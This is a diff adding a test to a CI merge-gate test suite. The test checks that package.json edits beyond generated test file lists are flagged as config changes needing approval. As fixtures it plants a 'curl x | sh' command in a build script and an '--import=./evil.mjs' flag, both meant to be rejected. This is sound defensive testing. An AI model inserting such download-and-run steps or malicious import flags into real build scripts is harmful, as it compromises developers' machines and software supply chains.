@@ -14,7 +14,7 @@ import { spawnSync } from "node:child_process";
 import { fileURLToPath } from "node:url";
 import {
   REQUIRED_CHECK, CI_APP, HOLD_LABEL, CONFIG_LABEL, ROWS, openVerdict, holdVerdict, configVerdict, planRow, ciVerdict, isConfigPath,
-  configFiles, filePaths, configPushState, ratchetsOnMerge, localMergeGenCheck, evaluate, rowLines, main, untrustedEnv, CI_WORKFLOW, TRUSTED_ROWS, ciSuitesFor, ciRetryVerdict,
+  configFiles, filePaths, configPushState, ratchetsOnMerge, localMergeGenCheck, evaluate, rowLines, main, untrustedEnv, CI_WORKFLOW, TRUSTED_ROWS, ciSuitesFor, ciRetryVerdict, generatedPkgVerdict,
 } from "../../tools/ci/merge-gate.mjs";
 import { parse as parseYAML } from "yaml";
 import { planHash } from "../../tools/ci/ready-gate.mjs";
@@ -1266,4 +1266,39 @@ test("ci retry: a CI that went green only on a re-run after a failed job fails t
   assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps, request: rq }).rows[k].ok), ["ci"]);
   f.runs[0].run_attempt = 1;
   assert.equal(evaluate({ pr: 7, ...f.deps, request: rq }).ok, true);
+});
+
+test("config: a package.json diff that is only the generated test file lists is not a config edit; any other package.json edit is", async () => {
+  const { renderPkg } = await import("../../tools/gen/gen-test-groups.mjs");
+  const groups = (files, extra = {}) => JSON.stringify({ groups: { "test:a": { kind: "node", files }, "test:c": { kind: "command", cmd: "node x.mjs" }, ...extra } });
+  const basePkgObj = { name: "x", scripts: { gen: "node tools/gen/gen-test-groups.mjs", "test:a": "", "test:c": "" } };
+  const basePkg = renderPkg(JSON.parse(groups(["tests/unit/season-cal.test.mjs"])), JSON.stringify(basePkgObj, null, 2) + "\n");
+  const baseGroups = groups(["tests/unit/season-cal.test.mjs"]);
+  const headGroups = groups(["tests/unit/season-cal.test.mjs", "tests/unit/badges.test.mjs"]);
+  const headPkg = renderPkg(JSON.parse(headGroups), basePkg);
+  assert.deepEqual(generatedPkgVerdict({ basePkg, headPkg, baseGroups, headGroups }), { ok: true, evidence: "package.json changes only generated test file lists (test:a)" });
+  const edited = headPkg.replace('"gen": "node', '"gen": "curl x | sh; node');
+  assert.equal(generatedPkgVerdict({ basePkg, headPkg: edited, baseGroups, headGroups }).ok, false, "a non-test script edit");
+  const cmdGroups = groups(["tests/unit/season-cal.test.mjs"]).replace("node x.mjs", "node y.mjs");
+  assert.equal(generatedPkgVerdict({ basePkg, headPkg: renderPkg(JSON.parse(cmdGroups), basePkg), baseGroups, headGroups: cmdGroups }).evidence,
+    "script test:c: its group's kind or flags changed (only file lists are generated data)", "a command group is never generated data");
+  const flagGroups = JSON.stringify({ groups: { ...JSON.parse(headGroups).groups, "test:a": { kind: "node", flags: ["--import=./evil.mjs"], files: ["tests/unit/season-cal.test.mjs"] } } });
+  assert.equal(generatedPkgVerdict({ basePkg, headPkg: renderPkg(JSON.parse(flagGroups), basePkg), baseGroups, headGroups: flagGroups }).ok, false, "a flag change");
+  assert.equal(generatedPkgVerdict({ basePkg, headPkg, baseGroups, headGroups: "{" }).ok, false, "unparseable fails closed");
+  assert.equal(generatedPkgVerdict({ basePkg, headPkg, baseGroups, headGroups, render: () => { throw new Error("boom"); } }).evidence, "the test-groups generator refused the head's tests/groups.json: boom");
+  // evaluate: the PR's only config path is that generated package.json → the config row passes without config-ok.
+  const f = fakes();
+  f.files.push({ filename: "package.json" }, { filename: "tests/groups.json" });
+  const b64 = (t) => ({ json: { encoding: "base64", content: Buffer.from(t).toString("base64") } });
+  const at = { [`contents/package.json?ref=${"m".repeat(40)}`]: b64(basePkg), [`contents/package.json?ref=${HEAD}`]: b64(headPkg),
+    [`contents/tests/groups.json?ref=${"m".repeat(40)}`]: b64(baseGroups), [`contents/tests/groups.json?ref=${HEAD}`]: b64(headGroups) };
+  const rq = (pkgAtHead) => (p) => p.startsWith("compare/deploy-x...") ? { json: { merge_base_commit: { sha: "m".repeat(40) } } }
+    : p === `contents/package.json?ref=${HEAD}` ? b64(pkgAtHead) : at[p] || f.deps.request(p);
+  const ok = evaluate({ pr: 7, ...f.deps, request: rq(headPkg) });
+  assert.equal(ok.rows.config.ok, true, ok.rows.config.evidence);
+  assert.equal(ok.rows.config.evidence.endsWith("; package.json changes only generated test file lists (test:a)"), true);
+  const bad = evaluate({ pr: 7, ...f.deps, request: rq(edited) });
+  assert.equal(bad.rows.config.evidence, "needs config-ok from brycejmurrin: the diff edits package.json; package.json counted as a config edit: package.json carries edits the test-groups generator does not reproduce");
+  const noMb = evaluate({ pr: 7, ...f.deps, request: (p) => (p.startsWith("compare/") ? { error: "HTTP 404" } : rq(headPkg)(p)) });
+  assert.equal(noMb.rows.config.ok, false, "an unreadable merge base fails closed");
 });
